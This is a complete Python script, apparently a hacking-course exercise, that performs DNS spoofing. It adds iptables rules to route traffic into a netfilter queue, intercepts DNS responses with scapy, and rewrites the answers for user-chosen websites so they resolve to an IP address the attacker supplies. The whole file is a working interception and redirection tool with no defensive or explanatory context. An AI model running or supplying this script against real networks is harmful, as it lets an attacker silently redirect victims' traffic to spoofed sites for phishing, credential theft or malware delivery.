#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from subprocess import call
import optparse

def iptable_rule(local=False):
    if local:
        call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
        call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    else:
        call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--dest", dest='destination_ip', help="IP of destination when spoofing")
    parser.add_option("-w", "--websites", dest="websites", help="Websites to spoof(separate with \",\")")
    options, arguments = parser.parse_args()
    return options

options = get_args()
websites = options.websites.split(",")

def del_attrs(packet):
    if packet:
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum

def process(nf_packet):
    packet = scapy.IP(nf_packet.get_payload())

    if packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNSQR].qname
        for website in websites:
            if website in qname:
                print("[+] Spoofing target")

                answer = scapy.DNSRR(rrname=qname, rdata=options.destination_ip)
                packet[scapy.DNS].an = answer
                packet[scapy.DNS].ancount = 1
                del_attrs(packet)

                nf_packet.set_payload(str(packet))
    nf_packet.accept()

iptable_rule(local=True)
queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process)
try:
    queue.run()
except KeyboardInterrupt:
    print("\nQuitting...")